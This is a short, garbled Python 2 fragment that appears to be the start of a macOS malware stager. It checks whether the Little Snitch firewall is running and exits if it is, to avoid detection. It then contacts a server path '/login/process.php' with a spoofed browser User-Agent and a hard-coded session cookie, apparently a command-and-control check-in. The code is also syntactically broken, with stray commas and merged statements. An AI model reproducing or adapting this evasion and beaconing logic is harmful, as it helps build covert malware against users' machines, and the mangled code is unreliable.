import sys
    import re
    import subprocess
    #Check if the "Little Snitch" process is running
cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) , out = ps.stdout.read()
ps.stdout.close() if re.search("Little Snitch", out):
sys.exit()
    #Send a request to a local server
import urllib2 UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' ,
server='http://127.0.0.1:80'
t='/login/process.php' req=urllib2.Request(server+t) , req.add_header('User-Agent',UA) req.add_header('Cookie',"session=t3VhVOs/DyCcDTFzIKanRxkvk3I=") ,
    proxy = urllib2.ProxyHandler() ,
    o = urllib2.build_opener(proxy)
urllib2.install_opener(o) ,
    a=urllib2.urlopen(req,timeout=3).read() ,
